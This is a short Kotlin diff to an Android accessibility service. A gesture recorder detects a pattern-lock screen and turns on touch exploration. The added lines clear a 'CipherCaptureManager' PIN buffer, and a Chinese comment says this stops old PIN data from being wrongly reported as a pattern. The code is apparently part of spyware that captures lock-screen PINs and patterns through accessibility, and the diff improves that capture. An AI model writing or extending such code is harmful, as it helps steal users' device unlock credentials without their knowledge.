@@ -193,7 +193,10 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
 
             if (!nodes.isNullOrEmpty() && nodes[0].isVisibleToUser) {
                 enableTouchExploration()
-                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索")
+                // 清空 CipherCaptureManager 的 PIN 缓冲，避免旧 PIN 数据被错误上报为图案
+                service.cipherCaptureManager?.pinDigits?.clear()
+                service.cipherCaptureManager?.pendingCipher = null
+                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索，已清空PIN缓冲")
             }
         } catch (e: Exception) {
             Log.w(TAG, "tryEnableTouchExploration error", e)
